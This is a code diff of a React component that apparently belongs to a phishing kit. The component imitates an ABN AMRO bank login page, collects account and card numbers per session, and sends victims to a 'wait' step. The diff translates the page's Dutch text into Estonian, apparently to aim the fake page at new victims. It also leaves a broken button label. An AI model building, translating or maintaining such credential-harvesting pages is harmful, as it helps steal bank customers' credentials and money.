@@ -60,7 +60,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
 
     setSaving(false);
     if (updateError) {
-      setError("Er is een fout opgetreden. Probeer het opnieuw.");
+      setError("Tekkis viga. Proovi uuesti.");
       return;
     }
     router.push(stepToPath("wait", sessionId));
@@ -172,7 +172,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
                 disabled={saving || accountNumber.length !== 9 || cardNumber.length !== 4}
                 className="bg-[#F3C000] hover:bg-[#e0b000] text-[#333333] px-6 py-[10px] text-[15px] font-medium transition-colors disabled:opacity-50 min-w-[120px]"
               >
-                {saving ? "Laden..." : "Inloggen"}
+                "Inloggen"
               </button>
             </form>
 
@@ -195,7 +195,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
             </div>
 
             <div className="mt-8 flex items-center justify-between text-[13px] text-[#009286] font-bold cursor-pointer">
-              Hulp nodig bij het inloggen?
+              Kas vajad sisselogimisel abi?
               <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
             </div>
           </div>
